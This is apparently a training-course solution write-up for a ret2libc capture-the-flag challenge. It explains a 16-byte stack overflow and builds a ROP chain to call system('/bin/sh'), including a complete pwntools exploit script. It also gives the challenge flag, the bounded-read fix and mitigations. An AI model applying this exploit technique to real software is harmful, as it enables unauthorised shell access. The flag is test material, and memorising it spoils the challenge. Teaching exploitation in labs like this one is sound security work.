# Binary Exploitation: ret2libc, Solution

> ⚠️ **Spoilers below.** The full ROP chain, the addresses, the alignment fix, the
> flag, and the source fix. If you want to solve it yourself, close this file and
> analyse the downloaded binary.

## The vulnerability

Identical to ret2win, `critical.c` overflows a 16-byte buffer, so you control the
saved return address at **offset 24** (16 buffer + 8 saved RBP):

```c
struct msg { char tag[16]; char body[48]; };  // 64 bytes

void vuln(void)
{
    char buf[16];
    read(0, buf, sizeof(struct msg));   // 64 bytes into a 16-byte buffer
}
```

What changed is the target. There is no `win()`, and `checksec` shows **NX
enabled**, so:

- You cannot jump to a single helpful function (there isn't one).
- You cannot inject shellcode onto the stack and jump to it (NX makes the stack
  non-executable).

So you **reuse existing code**: chain gadgets to call `system("/bin/sh")`.

## The ingredients (all at fixed addresses, the binary is `-no-pie`)

Find them in the downloaded binary, Ghidra shows them all, or on the command line:

```bash
objdump -d -M intel ./ret2libc | grep '<system@plt>:'   # system@plt
ROPgadget --binary ./ret2libc | grep ': pop rdi ; ret'  # pop rdi; ret gadget
ROPgadget --binary ./ret2libc --string '/bin/sh'        # the "/bin/sh" string
```

(The **Debug** dial's **ROP ingredients** panel lists the same addresses, but you
never need it; everything here works from the downloaded binary alone.)

In the shipped build (read the *current* values, they are build-specific):

| ingredient        | address     |
|-------------------|-------------|
| `system@plt`      | `0x401040`  |
| `"/bin/sh"`       | `0x402008`  |
| `pop rdi; ret`    | `0x401156`  |
| bare `ret`        | `0x401157`  (the byte right after `pop rdi`) |

## The chain

To call `system("/bin/sh")` you need RDI = address of `"/bin/sh"`, then call
`system`:

```
[ 24 bytes padding      ]   fill buf + saved RBP, reach the return address
[ ret                   ]   16-byte stack alignment (see below)
[ pop rdi ; ret         ]   pop the next value into RDI...
[ &"/bin/sh"            ]   ...which is the string's address
[ system@plt            ]   call system(RDI) = system("/bin/sh")
```

### The alignment gotcha

If you drop the bare `ret` and go straight `pop rdi → &"/bin/sh" → system`, the
program **segfaults inside `system`**. Modern glibc uses SSE instructions
(`movaps`) that fault unless RSP is 16-byte aligned at the call. Your chain leaves
RSP off by 8, so you prepend one extra `ret` gadget to nudge it back into
alignment. This is the single most common "why doesn't my ret2libc work" bug.

### Getting the flag out

`system("/bin/sh")` launches a shell that reads its commands **from stdin**: the
same stdin your payload came in on. The vulnerable `read` only consumed the first
64 bytes, so pad your chain to exactly 64 bytes and then append a command:

```
<chain, padded to 64 bytes>cat /flag
```

The shell reads `cat /flag` and runs it:

- **Flag:** `R0pP4stTh3NX`

## The fix

Same as ret2win, bound the read so nothing reaches the return address:

```c
void vuln(void)
{
    char buf[16];
    read(0, buf, sizeof buf);
}
```

**Save** (recompiles), resend the chain: `vuln()` returns normally, no shell.

## Why NX didn't help (task f)

- **NX / DEP** stops code you *inject*; it does nothing against code you *reuse*.
  ROP lives entirely in already-executable memory, so NX is irrelevant to it.
- A **stack canary** would catch this overflow before `vuln()` returns (try adding
  `-fstack-protector-all` in the Fix editor's flags field, the chain gets caught,
  signal 6).
- **PIE + ASLR** would randomize `system@plt`, `"/bin/sh"`, and the gadget, so your
  fixed addresses would miss, until you add an **info leak** to recover the base.
- **CFI / shadow stacks** (Intel CET) break return-address hijacking more
  fundamentally, but are not universally deployed.

Each is defense in depth; the actual fix is bounding the read.

## Professional tools

None of this uses the challenge's debug view, you work from the downloaded binary.
**Ghidra** decompiles `ret2libc` so you can read `vuln()` and spot the imported
`system`, the `"/bin/sh"` string, and the gadget without running anything.
**ROPgadget** finds gadgets and strings; **pwntools** builds and packs the chain:

```python
from pwn import *

e = ELF('./ret2libc')
rop = ROP(e)
rop.raw(rop.ret)                       # 16-byte alignment
rop.system(next(e.search(b'/bin/sh\x00')))   # pop rdi; /bin/sh; system

payload  = b'A' * 24 + rop.chain()
payload  = payload.ljust(64, b'B')     # read() consumes exactly 64 bytes...
payload += b'cat /flag\n'              # ...the rest is the shell's input

p = process('./ret2libc')
p.send(payload)
print(p.recvall(timeout=1).decode())   # -> the flag
```

`pwntools`' `ROP` object even resolves `rop.system(...)` and the alignment `ret`
for you, but only once you understand, by hand, why each link is there.

This is the last web rung of the binary ladder. The natural next steps (out of
scope here) add an **info leak** to beat PIE/ASLR, or a full **ret2syscall** chain,
and the course's agentic-pentest capstone (HexStrike AI) revisits all of these.
